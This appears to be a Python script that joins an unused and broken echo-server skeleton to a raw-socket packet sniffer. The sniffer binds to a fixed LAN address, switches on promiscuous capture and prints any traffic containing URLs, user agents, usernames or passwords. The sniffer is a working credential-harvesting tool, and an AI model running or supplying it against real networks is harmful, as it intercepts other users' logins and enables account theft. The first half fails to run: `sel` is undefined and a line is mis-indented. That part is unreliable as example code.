
import socket
import sys
import selectors
import types

#------------------------------------------

def accept_wrapper(sock):
	conn, addr = sock.accept() 
	print("accepted connection from", addr)
	conn.setblocking(False)
	data = types.SimpleNamespace(addr=addr, inb=b"", outb=b"")
	events = selectors.EVENT_READ | selectors.EVENT_WRITE
	sel.register(conn, events, data=data)


def service_connection(key, mask):
	sock = key.fileobj
	data = key.data
	if mask & selectors.EVENT_READ:
	recv_data = sock.recv(1024)
		if recv_data:
			data.outb += recv_data
		else:
			print("closing connection to", data.addr)
			sel.unregister(sock)
			sock.close()
	if mask & selectors.EVENT_WRITE:
		if data.outb:
			print("echoing", repr(data.outb), "to", data.addr)
			sent = sock.send(data.outb)
			data.outb = data.outb[sent:]

def sock_class():
	if len(sys.argv) != 3:
		print("usage:", sys.argv[0], "<host> <port>")
		sys.exit(1)

	host, port = sys.argv[1], int(sys.argv[2])
	lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	lsock.bind((host, port))
	lsock.listen()
	print("listening on", (host, port))
	lsock.setblocking(False)
	sel.register(lsock, selectors.EVENT_READ, data=None)

	try:
		while True:
			events = sel.select(timeout=None)
			for key, mask in events:
				if key.data is None:
					accept_wrapper(key.fileobj)
				else:
					service_connection(key, mask)
	except KeyboardInterrupt:
		print("Keyboard Interrupt")
	finally:
		sel.close()

#------------------------------------------

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
s.bind(("192.168.43.126", 0))
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)

while True:
	#print (s.recvfrom(65565))
	data = s.recvfrom(65565)
	try:
		#print ('1')
		if "Host:" in '[{}]'.format(data):
			print("\n\nGot URL: " + '[{}]'.format(data))
		elif "USER-AGENT:" in '[{}]'.format(data):
			print("\n\nUser Agent: " + '[{}]'.format(data))
		if "user_name" in '[{}]'.format(data) or "usr" in '[{}]'.format(data):
			print("\n\nGot Username: " + '[{}]'.format(data))
		if "password" in '[{}]'.format(data) or "pwd" in '[{}]'.format(data):
			print("\n\nGot Password: " + '[{}]'.format(data))
	except:
		pass
